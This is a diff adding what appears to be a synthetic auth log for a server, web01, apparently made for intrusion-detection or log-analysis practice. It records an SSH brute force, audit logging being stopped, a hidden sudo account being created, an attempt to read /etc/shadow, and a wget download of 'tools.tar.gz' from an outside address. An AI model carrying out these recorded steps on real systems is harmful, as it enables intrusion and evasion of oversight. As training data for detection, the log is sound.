@@ -1,0 +1,42 @@
+Jul 12 00:11:07 web01 CRON[1401]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jul 12 00:11:09 web01 CRON[1401]: pam_unix(cron:session): session closed for user root
+Jul 12 01:02:33 web01 sshd[1662]: Accepted publickey for deploy from 198.51.100.10 port 51022 ssh2: RSA SHA256:9f2b1c7ae4
+Jul 12 01:02:33 web01 sshd[1662]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jul 12 01:06:50 web01 sshd[1662]: pam_unix(sshd:session): session closed for user deploy
+Jul 12 02:14:01 web01 sshd[2044]: Failed password for root from 198.51.100.23 port 41010 ssh2
+Jul 12 02:14:09 web01 sshd[2051]: Accepted password for root from 198.51.100.23 port 41022 ssh2
+Jul 12 02:14:09 web01 sshd[2051]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Jul 12 02:15:22 web01 auditd[812]: The audit daemon is exiting.
+Jul 12 02:15:23 web01 systemd[1]: Stopped Security Auditing Service.
+Jul 12 02:16:44 web01 useradd[2210]: new user: name=svc_backup, UID=1004, GID=1004, home=/home/svc_backup, shell=/bin/bash
+Jul 12 02:16:45 web01 usermod[2215]: add 'svc_backup' to group 'sudo'
+Jul 12 02:19:31 web01 sshd[2051]: pam_unix(sshd:session): session closed for user root
+Jul 12 07:40:12 web01 systemd[1]: Started Security Auditing Service.
+Jul 12 08:15:03 web01 sshd[2610]: Accepted publickey for jsmith from 198.51.100.23 port 49770 ssh2: RSA SHA256:2ab41d90ff
+Jul 12 08:15:03 web01 sshd[2610]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)
+Jul 12 09:02:41 web01 sshd[2688]: Accepted publickey for jsmith from 198.51.100.23 port 49820 ssh2: RSA SHA256:2ab41d90ff
+Jul 12 09:07:58 web01 sshd[2701]: Accepted password for jsmith from 203.0.113.77 port 33110 ssh2
+Jul 12 09:12:05 web01 sudo:   jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/apt update
+Jul 12 09:20:11 web01 sudo:   webdev : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/webdev ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jul 12 09:21:40 web01 sudo:   webdev : user NOT in sudoers ; TTY=pts/2 ; PWD=/home/webdev ; USER=root ; COMMAND=/usr/bin/id
+Jul 12 10:31:02 web01 sshd[3311]: Invalid user admin from 203.0.113.45 port 40122
+Jul 12 10:31:02 web01 sshd[3311]: Failed password for invalid user admin from 203.0.113.45 port 40122 ssh2
+Jul 12 10:31:05 web01 sshd[3313]: Failed password for invalid user admin from 203.0.113.45 port 40130 ssh2
+Jul 12 10:31:09 web01 sshd[3315]: Failed password for invalid user oracle from 203.0.113.45 port 40144 ssh2
+Jul 12 10:31:14 web01 sshd[3317]: Failed password for invalid user postgres from 203.0.113.45 port 40158 ssh2
+Jul 12 10:31:20 web01 sshd[3319]: Failed password for invalid user test from 203.0.113.45 port 40170 ssh2
+Jul 12 10:31:27 web01 sshd[3321]: Failed password for invalid user git from 203.0.113.45 port 40188 ssh2
+Jul 12 10:31:35 web01 sshd[3323]: Failed password for admin from 203.0.113.45 port 40202 ssh2
+Jul 12 10:32:44 web01 sshd[3330]: Failed password for admin from 203.0.113.45 port 40260 ssh2
+Jul 12 10:33:47 web01 sshd[3341]: Accepted password for admin from 203.0.113.45 port 41988 ssh2
+Jul 12 10:33:47 web01 sshd[3341]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Jul 12 10:35:02 web01 sshd[3341]: subsystem request for sftp by user admin
+Jul 12 10:41:12 web01 sudo:   admin : TTY=pts/3 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.200/tools.tar.gz
+Jul 12 10:42:30 web01 su[3390]: (to root) admin on pts/3
+Jul 12 10:42:30 web01 su[3390]: pam_unix(su:session): session opened for user root by admin(uid=1001)
+Jul 12 12:05:11 web01 sshd[3702]: Accepted publickey for deploy from 198.51.100.10 port 52140 ssh2: RSA SHA256:9f2b1c7ae4
+Jul 12 12:05:11 web01 sshd[3702]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jul 12 13:30:02 web01 CRON[3811]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jul 12 13:30:04 web01 CRON[3811]: pam_unix(cron:session): session closed for user root
+Jul 12 14:18:27 web01 sshd[3902]: Accepted publickey for jsmith from 198.51.100.23 port 50112 ssh2: RSA SHA256:2ab41d90ff
+Jul 12 17:44:19 web01 sshd[4120]: Received disconnect from 198.51.100.10 port 52140:11: disconnected by user
